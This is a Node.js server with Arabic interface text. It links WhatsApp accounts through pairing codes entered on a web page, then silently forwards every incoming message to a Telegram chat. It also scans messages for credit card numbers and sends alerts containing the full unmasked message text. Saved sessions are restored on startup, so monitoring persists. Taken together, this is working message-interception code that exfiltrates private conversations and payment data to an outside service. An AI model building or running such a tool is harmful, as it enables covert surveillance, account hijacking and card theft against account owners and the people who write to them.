import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { makeWASocket, useMultiFileAuthState, Browsers, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ========== إعداد تليجرام ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let telegramBot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('✅ بوت تليجرام جاهز للإرسال');
} else {
    console.warn('⚠️ تليجرام غير مهيأ، لن يتم إرسال الإشعارات');
}

async function sendToTelegram(messageText) {
    if (!telegramBot) return;
    try {
        await telegramBot.sendMessage(TELEGRAM_CHAT_ID, messageText, { parse_mode: 'Markdown' });
        console.log('📨 تم إرسال إشعار إلى تليجرام');
    } catch (err) {
        console.error('❌ فشل إرسال إلى تليجرام:', err.message);
    }
}

// كشف البيانات الحساسة
function scanForSensitiveData(text) {
    const patterns = [
        {
            name: '💳 بطاقة ائتمان',
            regex: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12})\b/g,
            mask: (m) => m.slice(0,4) + '-****-****-' + m.slice(-4)
        }
    ];
    const detected = [];
    for (const p of patterns) {
        let match;
        p.regex.lastIndex = 0;
        while ((match = p.regex.exec(text)) !== null) {
            detected.push({ type: p.name, original: match[0], masked: p.mask(match[0]) });
        }
    }
    return detected;
}

// ========== إعداد الخادم ==========
const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" }, transports: ['websocket', 'polling'] });

const activeSessions = new Map();
const sessionsData = new Map();

// إنشاء جلسة واتساب مع تأخير طلب الرمز واستعادة
async function createWhatsAppSession(phoneNumber, isRestore = false) {
    console.log(`[${phoneNumber}] جاري إنشاء الجلسة...`);
    const sessionDir = path.join(__dirname, `auth_sessions/${phoneNumber}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { version } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false,
        defaultQueryTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        generateHighQualityLinkPreview: false,
    });

    sock.ev.on('creds.update', saveCreds);
    let pairingRequested = false;

    sock.ev.on('connection.update', async (update) => {
        const connectionState = update.connection;
        console.log(`[${phoneNumber}] حالة الاتصال: ${connectionState}`);

        if (connectionState === 'open' && !state.creds.registered && !pairingRequested && !isRestore) {
            pairingRequested = true;
            // تأخير 5 ثوانٍ لضمان استقرار الاتصال
            setTimeout(async () => {
                try {
                    const code = await sock.requestPairingCode(phoneNumber);
                    console.log(`[${phoneNumber}] 🔐 رمز الاقتران: ${code}`);
                    io.emit('pairing_code', { code, phoneNumber });
                    await sendToTelegram(`🔄 *جاري ربط حساب واتساب:* ${phoneNumber}\n🔑 الرمز: \`${code}\``);
                } catch (err) {
                    console.error(`[${phoneNumber}] فشل طلب الرمز: ${err.message}`);
                    io.emit('error', `فشل طلب الرمز للرقم ${phoneNumber}`);
                    pairingRequested = false;
                }
            }, 5000);
        } else if (connectionState === 'close') {
            console.log(`[${phoneNumber}] تم قطع الاتصال – إعادة المحاولة بعد دقيقة`);
            setTimeout(() => createWhatsAppSession(phoneNumber, false), 60000);
        }
    });

    // مراقبة الرسائل الواردة
    sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            if (msg.message && !msg.key.fromMe) {
                const sender = msg.key.remoteJid;
                let messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                if (!messageText) continue;

                const senderName = msg.pushName || sender;
                const time = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });

                const telegramMsg = `📩 *رسالة جديدة* 📩\n👤 *من:* ${senderName}\n📱 *حساب واتساب المستلم:* ${phoneNumber}\n⏰ *الوقت:* ${time}\n💬 *النص:*\n${messageText.substring(0, 500)}`;
                await sendToTelegram(telegramMsg);

                const sensitive = scanForSensitiveData(messageText);
                if (sensitive.length > 0) {
                    const details = sensitive.map(s => `${s.type}: ${s.masked}`).join('\n');
                    const alertMsg = `🚨 *تنبيه: تم اكتشاف معلومات حساسة!* 🚨\n${details}\n\n📝 الرسالة الأصلية:\n${messageText}`;
                    await sendToTelegram(alertMsg);
                }
            }
        }
    });

    return sock;
}

// استعادة الجلسات المحفوظة عند بدء التشغيل
async function restoreSessions() {
    const sessionsDir = path.join(__dirname, 'auth_sessions');
    if (!fs.existsSync(sessionsDir)) return;
    const phones = fs.readdirSync(sessionsDir).filter(f => f !== '.DS_Store');
    for (const phone of phones) {
        console.log(`[${phone}] استعادة الجلسة...`);
        try {
            const sock = await createWhatsAppSession(phone, true);
            activeSessions.set(phone, { sock, status: 'مراقب' });
            sessionsData.set(phone, { phone, status: 'مراقب', date: new Date().toLocaleString() });
            await sendToTelegram(`✅ *تم استعادة حساب واتساب:* ${phone}`);
        } catch (err) {
            console.error(`[${phone}] فشل الاستعادة:`, err.message);
        }
    }
    io.emit('accounts_list', Array.from(sessionsData.values()));
}

// ========== واجهة HTML كاملة ==========
const HTML_PAGE = `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مراقب واتساب – إرسال إلى تليجرام</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #075E54; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: white; border-radius: 20px; max-width: 700px; width: 100%; padding: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        h1 { color: #075E54; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; direction: ltr; text-align: left; box-sizing: border-box; }
        button { background: #25D366; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; margin-top: 5px; }
        button:disabled { background: #ccc; }
        .status { margin-top: 15px; padding: 10px; border-radius: 8px; display: none; font-size: 14px; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .status.info { background: #e2f0fb; color: #0c5460; display: block; }
        .accounts-list { text-align: right; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; max-height: 400px; overflow-y: auto; }
        .account-item { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 8px; border-right: 4px solid #25D366; }
        .code-box { background: #f5f5f5; padding: 15px; font-family: monospace; font-size: 24px; letter-spacing: 4px; margin: 15px 0; border-radius: 8px; direction: ltr; }
        .loader { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-left: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .hidden { display: none; }
        .small-text { font-size: 12px; color: #666; margin-top: 5px; }
    </style>
</head>
<body>
<div class="container">
    <h1>📱 مراقب رسائل واتساب</h1>
    <p>أدخل رقم هاتف لربط حساب ومراقبة جميع رسائله</p>
    <input type="tel" id="phone" placeholder="مثال: 967776730674" dir="ltr">
    <button id="addBtn">➕ إضافة حساب جديد</button>
    <div id="status" class="status"></div>
    <div id="codeSection" class="hidden"><div class="code-box" id="codeDisplay"></div><p>✨ أدخل هذا الرمز في واتساب (الإعدادات ← الأجهزة المرتبطة)</p></div>
    <div class="accounts-list"><strong>📋 الحسابات المرتبطة:</strong><div id="accountsList">لا توجد حسابات بعد.</div></div>
    <div class="small-text">⚠️ كل رسالة تصل لهذه الحسابات سترسل فوراً إلى تليجرام مع كشف البطاقات الائتمانية.</div>
</div>
<script>
    const socket = io();
    const addBtn = document.getElementById('addBtn');
    const phoneInput = document.getElementById('phone');
    const statusDiv = document.getElementById('status');
    const codeSection = document.getElementById('codeSection');
    const codeDisplay = document.getElementById('codeDisplay');
    const accountsList = document.getElementById('accountsList');
    function showStatus(msg, type) { statusDiv.textContent = msg; statusDiv.className = 'status ' + type; }
    addBtn.onclick = () => {
        const phone = phoneInput.value.trim().replace(/[^0-9]/g, '');
        if (!phone || phone.length < 8) return showStatus('❌ رقم غير صحيح', 'error');
        addBtn.disabled = true;
        addBtn.innerHTML = '<span class="loader"></span> جاري ربط الحساب...';
        showStatus('⏳ جاري التجهيز... قد يستغرق 30-45 ثانية', 'info');
        socket.emit('add_account', { phone });
    };
    socket.on('pairing_code', (data) => {
        if (data.phoneNumber === phoneInput.value.trim().replace(/[^0-9]/g, '')) {
            addBtn.style.display = 'none';
            phoneInput.disabled = true;
            codeDisplay.innerHTML = data.code;
            codeSection.classList.remove('hidden');
            showStatus('✅ تم إنشاء الرمز! أدخله في واتساب', 'success');
            setTimeout(() => socket.emit('request_accounts'), 5000);
        }
    });
    socket.on('accounts_list', (accounts) => {
        if (!accounts || accounts.length === 0) accountsList.innerHTML = 'لا توجد حسابات بعد.';
        else accountsList.innerHTML = accounts.map(acc => '<div class="account-item">📱 <strong>الحساب:</strong> ' + acc.phone + '<br>🟢 <strong>الحالة:</strong> ' + (acc.status || 'مراقب') + '<br>🕒 <strong>التاريخ:</strong> ' + (acc.date || 'الآن') + '</div>').join('');
    });
    socket.on('error', (msg) => { addBtn.disabled = false; addBtn.innerHTML = '➕ إضافة حساب جديد'; showStatus('❌ ' + msg, 'error'); });
    socket.on('connect', () => { showStatus('✅ متصل بالخادم', 'success'); socket.emit('request_accounts'); });
    socket.on('disconnect', () => showStatus('❌ انقطع الاتصال', 'error'));
</script>
</body>
</html>`;

app.get('/', (req, res) => res.send(HTML_PAGE));
app.get('/health', (req, res) => res.status(200).send('OK'));

// أحداث Socket.IO
io.on('connection', (socket) => {
    console.log('🟢 عميل متصل:', socket.id);
    socket.on('add_account', async ({ phone }) => {
        const cleanPhone = phone.replace(/\D/g, '');
        if (activeSessions.has(cleanPhone)) {
            socket.emit('error', `الحساب ${cleanPhone} موجود مسبقًا`);
            return;
        }
        try {
            const sock = await createWhatsAppSession(cleanPhone, false);
            activeSessions.set(cleanPhone, { sock, status: 'مراقب' });
            sessionsData.set(cleanPhone, { phone: cleanPhone, status: 'مراقب', date: new Date().toLocaleString() });
            io.emit('accounts_list', Array.from(sessionsData.values()));
            socket.emit('status', `تم بدء ربط ${cleanPhone}...`);
            await sendToTelegram(`✅ تم ربط حساب واتساب جديد: ${cleanPhone}`);
        } catch (err) {
            socket.emit('error', `فشل ربط الحساب: ${err.message}`);
        }
    });
    socket.on('request_accounts', () => {
        socket.emit('accounts_list', Array.from(sessionsData.values()));
    });
});

// معالجة الأخطاء
process.on('uncaughtException', (err) => console.error('❌ خطأ غير متوقع:', err));
process.on('unhandledRejection', (err) => console.error('❌ رفض وعد غير معالج:', err));

const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`🚀 يعمل على http://localhost:${PORT}`);
    await restoreSessions(); // استعادة الجلسات عند بدء التشغيل
}); 
